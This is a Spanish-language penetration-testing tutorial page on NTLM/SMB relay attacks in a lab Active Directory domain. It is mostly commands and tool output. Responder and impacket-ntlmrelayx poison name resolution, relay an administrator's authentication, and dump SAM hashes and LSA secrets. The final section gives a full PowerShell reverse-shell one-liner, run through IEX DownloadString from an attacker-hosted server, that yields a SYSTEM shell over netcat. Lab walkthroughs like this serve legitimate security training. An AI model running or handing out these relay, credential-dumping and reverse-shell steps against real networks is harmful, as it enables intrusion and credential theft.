---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# NTLM - SMB Relay

Esta tecnica consiste en envenenar la red como haciamos antes, pero en vez de solo obtener el `hash NTLMv2` vamos a obtener acceso al servicio directamente con una autenticacion de forma legal, por ejemplo vamos a obtener acceso al servicio de `SMB` abriendonos nosotros un servidor de `SMB` falso, nos pondremos en mitada de la comunicacion y cuando un usuario legitimo quiera acceder a un recuros compartido mediante este servicio y falle, lo que va hacer es que nosotros vamos autenticarnos contra ese recurso como si fuera real y nosotros vamos a reenviar la peticion al `administrador` para que este nos conteste con el paquete cifrado del `challengue` y se lo enviamos al usuario para que haga su funcion, asi sucesivamente hasta que nos llegue la sesion del servicio a nosotros y ya cortamos comunicacion con el usuario una vez que hayamos obtenido el servicio `SMB` de forma autenticada.

Basicamente esta tecnica consiste en directamente autenticarte contra un servicio sin necesidad de obtener ningun `hash` ni nada parecido, solamente siendo tu el de la comunicacion central entre `Cliente-Servidor`.

> IMPORTANTE

No debe de tener el `SMB` la opcion activada del `firmado` ya que con esto autentica que la comunicacion sea legitima y no podremos realizar esta tecnica, generalmente en entornos reales no suele estar activado, por lo que podremos realizar dicha tecnica.

Para nosotros saber si lo tiene firmado o no, podremos hacer lo siguiente:

```shell
crackmapexec smb 192.168.5.0/24
```

Info:

```
SMB         192.168.5.5     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:corp.local) (signing:True) (SMBv1:False)
SMB         192.168.5.208   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:corp.local) (signing:False) (SMBv1:False)
```

Vemos que el `DC01` si lo tiene firmado, pero el `WS01` no lo tiene firmado, por lo que puede ser un vector de entrada para dicho equipo.

Lo observamos en la siguiente seccion:

```
signing:False
```

De primeras vamos a crear un fichero llamado `targets.txt` en el que vamos a incluir la `IP` que vemos que no tiene le firmado activado del `SMB` que en este caso seria la siguiente:

> targets.txt

```
192.168.5.208
```

Y ahora ejecutaremos el siguiente comando:

```shell
impacket-ntlmrelayx -smb2support -tf targets.txt 
```

Con el `-tf` especificamos el `Target File` que es el fichero donde estan todas las `IP's` que nos interesan.

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay enabled

[*] Servers started, waiting for connections
```

Esto lo que esta haciendo es levantarnos dichos `protocolos` y tambien `servidores` para estar en mitada de la comunicacion con ellos, haciendonos pasar nosotros por la maquina que se encuentra en mitad de la comunicacion, para realizar lo que comente anteriormente.

Como tenemos estos servidores levantados y tambien necesitamos utilizar `responder` vamos a editar el archivo de `responder` para desactivar el que nos levante los servidores que ya estan levantados en la otra herramienta, para ponernos asi en mitad de la comunicacion gracia a la herramienta.

```shell
sudo nano /etc/responder/Responder.conf

#Dentro del nano
SMB      = Off
HTTP     = Off
```

Con estos cambios lo guardamos y ejecutamos lo siguiente:

```shell
sudo responder -I eth0 -wd
```

Info:

```
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [OFF]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.5.205]
    Responder IPv6             [fe80::126b:3f32:5e50:9e6]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-5S54Y5ALWCG]
    Responder Domain Name      [0F4A.LOCAL]
    Responder DCE-RPC Port     [49200]

[+] Listening for events...
```

Ahora si nosotros con cualquier usuario, por ejemplo el `Administrador` en el `PowerShell` del `DC01` del `Administrador` ejecuta una ruta que no existe:

```powershell
dir \\fhuisjf\c$
```

Le fallara y si nos volvemos a donde tenemos las 2 herramientas veremos lo siguiente:

> Responder

```
[*] [NBT-NS] Poisoned answer sent to 192.168.5.5 for name FHUISJF (service: File Server)
[*] [LLMNR]  Poisoned answer sent to fe80::2129:cfa3:af2a:edd8 for name fhuisjf
[*] [LLMNR]  Poisoned answer sent to 192.168.5.5 for name fhuisjf
[*] [MDNS] Poisoned answer sent to 192.168.5.5     for name fhuisjf.local
[*] [MDNS] Poisoned answer sent to 192.168.5.5     for name fhuisjf.local
[*] [MDNS] Poisoned answer sent to fe80::2129:cfa3:af2a:edd8 for name fhuisjf.local
[*] [MDNS] Poisoned answer sent to fe80::2129:cfa3:af2a:edd8 for name fhuisjf.local
[*] [LLMNR]  Poisoned answer sent to 192.168.5.5 for name fhuisjf
[*] [LLMNR]  Poisoned answer sent to fe80::2129:cfa3:af2a:edd8 for name fhuisjf
```

> impacket-ntlmrelayx

```
[*] Received connection from CORP/Administrator at DC01, connection will be relayed after re-authentication
[]
[*] SMBD-Thread-5 (process_request_thread): Connection from CORP/ADMINISTRATOR@192.168.5.5 controlled, attacking target smb://192.168.5.208
[*] Authenticating against smb://192.168.5.208 as CORP/ADMINISTRATOR SUCCEED
[*] All targets processed!
[*] SMBD-Thread-5 (process_request_thread): Connection from CORP/ADMINISTRATOR@192.168.5.5 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xc8125866b327df176940c9f2d6a48f5f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5ed544e71abe56b376b7993b21946520:::
santiago:1001:aad3b435b51404eeaad3b435b51404ee:7ce21f17c0aee7fb9ceba532d0546ad6:::
[*] Done dumping SAM hashes for host: 192.168.5.208
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```

Vemos que hemos sacado informacion del `Administrador` volcando tambien la `SAM`.

Pero no solo podemos hacer esto, si no que tambien podremos ejecutar un comando redirijiendolo a un `proxy`.

```shell
impacket-ntlmrelayx -smb2support -tf targets.txt -socks
```

Ahora cuando de nuevo cualquier usuario se conecte de forma erronea a un recurso compartido, pasara que se nos creara una conexion activa en `SOCKS`.

Por lo que ejecutamos esto en `DC01` como el usuario `Administrador`, pero puede ser bajo cualquier usuario, funciona con caulquiera.

```powershell
dir \\fhuisjf\c$
```

Esto nos dara un error como esperamos y si volvemos a donde tenemos la escucha del servidor del `socks` veremos lo siguiente:

```
[*] Received connection from CORP/Administrator at DC01, connection will be relayed after re-authentication
[]
[*] SMBD-Thread-13 (process_request_thread): Connection from CORP/ADMINISTRATOR@192.168.5.5 controlled, attacking target smb://192.168.5.208
[*] Authenticating against smb://192.168.5.208 as CORP/ADMINISTRATOR SUCCEED
[*] SOCKS: Adding CORP/ADMINISTRATOR@192.168.5.208(445) to active SOCKS connection. Enjoy
[*] All targets processed!
[*] SMBD-Thread-13 (process_request_thread): Connection from CORP/ADMINISTRATOR@192.168.5.5 controlled, but there are no more targets left!
```

Tendremos que pulsar `ENTER` y veremos el siguiente `prompt`:

```
ntlmrelayx>
```

Ejecutamos dentro de esta interfaz el comando `socks` y veremos que tendremos una sesion activa de la siguiente forma:

```shell
ntlmrelayx> socks
```

Info:

```
Protocol  Target         Username            AdminStatus  Port 
--------  -------------  ------------------  -----------  ----
SMB       192.168.5.208  CORP/ADMINISTRATOR  TRUE         445
```

Ahora para poder interactuar con esta sesion, vamos a utilizar `proxuchange` que viene en `kali` de la siguiente forma en otra terminal:

```shell
sudo nano /etc/proxychains4.conf

#Dentro del nano
socks4  127.0.0.1 1080
```

Lo que estamos haciendo con esto es redirigir todo el trafico de red de la herramienta que ejecutemos a nuestro `localhost` en el puerto `1080` que es justamente donde esta escuchando este `NTLM Relay`.

Ahora vamos a utilizar la herramienta `crackmapexec` pero utilizando la herramienta `proxychange4`, lo que haremos es que redirigiremos ese trafico de red que va a generar `crackmapexec` o la herramienta que pongamos despues de `proxychange4` y lo va hacer en `127.0.0.1 1080` que es donde tenemos la sesion activa:

```shell
proxychains4 crackmapexec smb 192.168.5.208 -u 'Administrator' -d 'corp'
```

Tendremos que poner el usuario el cual nos aparezca donde capturo en la sesion de `ntlmrelayx` en mi caso fue el `Administrador`.

Info:

```
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.5.208:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.5.208:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.5.208:135 <--denied
SMB         192.168.5.208   445    WS01             [*] Windows 10 / Server 2019 Build 19041 (name:WS01) (domain:corp) (signing:False) (SMBv1:False)
```

Con esto estamos viendo que se esta ejecutando correctamente, por lo que ahora vamos a mandar las peticiones que queramos como si fueramos el usuario `Administrador` en este caso:

```shell
proxychains4 crackmapexec smb 192.168.5.208 -u 'Administrator' -d 'corp' -p '1234' --sam
```

En el `-p` especificamos el `password` pero en este caso podremos poner lo que sea ya que estamos autenticados y cualquier palabra nos servira como contraseña ya que lo `omitira` por asi decirlo.

En este caso lo que haremos sera volcar la `SAM` con esta sesion de forma `proxyficada`.

Info:

```
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.5.208:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.5.208:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.5.208:135 <--denied
SMB         192.168.5.208   445    WS01             [*] Windows 10 / Server 2019 Build 19041 (name:WS01) (domain:corp) (signing:False) (SMBv1:False)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.5.208:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.5.208:445  ...  OK
SMB         192.168.5.208   445    WS01             [+] corp\Administrator:1234 (Pwn3d!)
SMB         192.168.5.208   445    WS01             [+] Dumping SAM hashes
SMB         192.168.5.208   445    WS01             Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.5.208   445    WS01             Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.5.208   445    WS01             DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.5.208   445    WS01             WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5ed544e71abe56b376b7993b21946520:::
SMB         192.168.5.208   445    WS01             santiago:1001:aad3b435b51404eeaad3b435b51404ee:7ce21f17c0aee7fb9ceba532d0546ad6:::
SMB         192.168.5.208   445    WS01             [+] Added 5 SAM hashes to the database
```

Vemos que ha funcionado y nos lo ha volcado.

O si queremos mejor saber todos los usuarios `cacheados` del sistema a nivel de dominio con el `lsass`.

```shell
proxychains4 crackmapexec smb 192.168.5.208 -u 'Administrator' -d 'corp' -p '1234' --lsa
```

Info:

```
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.5.208:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.5.208:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.5.208:135 <--denied
SMB         192.168.5.208   445    WS01             [*] Windows 10 / Server 2019 Build 19041 (name:WS01) (domain:corp) (signing:False) (SMBv1:False)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.5.208:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.5.208:445  ...  OK
SMB         192.168.5.208   445    WS01             [+] corp\Administrator:1234 (Pwn3d!)
SMB         192.168.5.208   445    WS01             [+] Dumping LSA secrets
SMB         192.168.5.208   445    WS01             CORP.LOCAL/empleado1:$DCC2$10240#empleado1#fda53d6158406f827388476bcbc97c37: (2025-01-25 08:10:18)
SMB         192.168.5.208   445    WS01             CORP.LOCAL/Administrator:$DCC2$10240#Administrator#e1c8d7e26653ae629a74772a389cf7e6: (2025-01-21 09:28:20)
SMB         192.168.5.208   445    WS01             CORP.LOCAL/annice.mable:$DCC2$10240#annice.mable#77702054bffe13f7c5bbe919a228d985: (2025-01-12 11:36:13)
SMB         192.168.5.208   445    WS01             CORP.LOCAL/angelika.shelly:$DCC2$10240#angelika.shelly#835512d4e4bb1d962c57d290eb99f670: (2025-01-12 16:51:40)
SMB         192.168.5.208   445    WS01             CORP\WS01$:aes256-cts-hmac-sha1-96:9a9fc7447f8fa5521eeef5af175be7af2189392bc0d56f2e7d41e4c15cdad294
SMB         192.168.5.208   445    WS01             CORP\WS01$:aes128-cts-hmac-sha1-96:73670fc7a88720c24ff4c869dc84a9c1
SMB         192.168.5.208   445    WS01             CORP\WS01$:des-cbc-md5:8c5bea107cc8c804
SMB         192.168.5.208   445    WS01             CORP\WS01$:plain_password_hex:5700320055006b0049004e0027003d005e0055005c00750052004c0077006e004e00510045003c002d0066005d004b005f007600330072004400350022002700750068004e00300041003d0024006c004e0022005700750065006b00640034004a0056006f003e006c005f006c0050005c005d002700360077002c00290033005e005d004f005e005100560027002e003200380029004f0078005100410049002c003a0025005f00680072005d00380034002500490068002200640045006f0072005c0063002d0022005f002f006f0065006700720022005f0061006c00780047006400590062007700770059005f00     
SMB         192.168.5.208   445    WS01             CORP\WS01$:aad3b435b51404eeaad3b435b51404ee:afc5c02d936d73808ce716070e883ab8:::
SMB         192.168.5.208   445    WS01             dpapi_machinekey:0x6be6aee6bc489e7fab1ed9a63b1aa5c0d2f13fef
dpapi_userkey:0xb83f8122ee552579d8fbf4d9b304ae19ab5bb7af                                                                                                                                     
SMB         192.168.5.208   445    WS01             NL$KM:5cb53b8cd528a0c36af257a308b6f7d4e47d11848f2c982b2ddd067d3053b4234b8dc77e92965b4867299950c1e427a6372c9d99e8fd5711cc4447ed306f9600
SMB         192.168.5.208   445    WS01             [+] Dumped 11 LSA secrets to /home/kali/.cme/logs/WS01_192.168.5.208_2025-01-25_050803.secrets and /home/kali/.cme/logs/WS01_192.168.5.208_2025-01-25_050803.cached
```

Vemos que nos vuelve a funcionar, por lo que tendremos de alguna forma comprometida la maquina con dicho usuario.

Lo que podemos tambien es ejecutar comandos directamente con la herramienta `ntlmrelayx`, en este caso ejecutaremos un `One Line` de `PowerShell` para hacernos una `reverse shell` a nuestro equipo.

Antes nos iremos a la pagina de la `One Line` que nos copiaremos:

URL = [GitHub OnleLine PowerShell ReverseShell](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)

```shell
nano shell.ps1

#Dentro del nano
$client = New-Object System.Net.Sockets.TCPClient('192.168.5.205',7777);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Lo guardamos y abriremos un servidor de `python3` para que lo pueda obtener la herramienta con el comando que vamos a ejecutar, ya que lo que vamos hacer es en el comando despues del `-c` obtener desde el servidor de `python3` el script y ejecutarlo a la misma vez para obtener la `reverse shell`.

```shell
python3 -m http.server
```

Tambien nos pondremos a la escucha para dejarlo listo de la siguiente forma:

```shell
nc -lvnp 7777
```

Y por ultimo vamos a ejecutar el comando para obtener dicha `shell`.

```shell
impacket-ntlmrelayx -smb2support -tf targets.txt -c "powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.5.205:8000/shell.ps1')\""
```

Ahora teniendo todo preparado, tendremos que ejecutar de neuvo un recurso compartido que no exista de la siguiente forma:

```powershell
dir \\fhuisjf\c$
```

Y si nos volvemos a donde tenemos la escucha con `nc` veremos lo siguiente:

Info:

> impacket-ntlmrelayx:

```
[*] Received connection from CORP/Administrator at DC01, connection will be relayed after re-authentication
[]
[*] SMBD-Thread-5 (process_request_thread): Connection from CORP/ADMINISTRATOR@192.168.5.5 controlled, attacking target smb://192.168.5.208
[*] Authenticating against smb://192.168.5.208 as CORP/ADMINISTRATOR SUCCEED
[*] All targets processed!
[*] SMBD-Thread-5 (process_request_thread): Connection from CORP/ADMINISTRATOR@192.168.5.5 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Executed specified command on host: 192.168.5.208
[-] SMB SessionError: code: 0xc0000043 - STATUS_SHARING_VIOLATION - A file cannot be opened because the share access flags are incompatible.
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```

> netcat:

```
listening on [any] 7777 ...
connect to [192.168.5.205] from (UNKNOWN) [192.168.5.208] 55964
whoami
nt authority\system
```

Si nos generara la `shell` puede ser por que el antivirus lo puede estar cortando el ejecutar ese `OneLine` si no, tendria que ofuscarse y ejecutarse de otra forma.
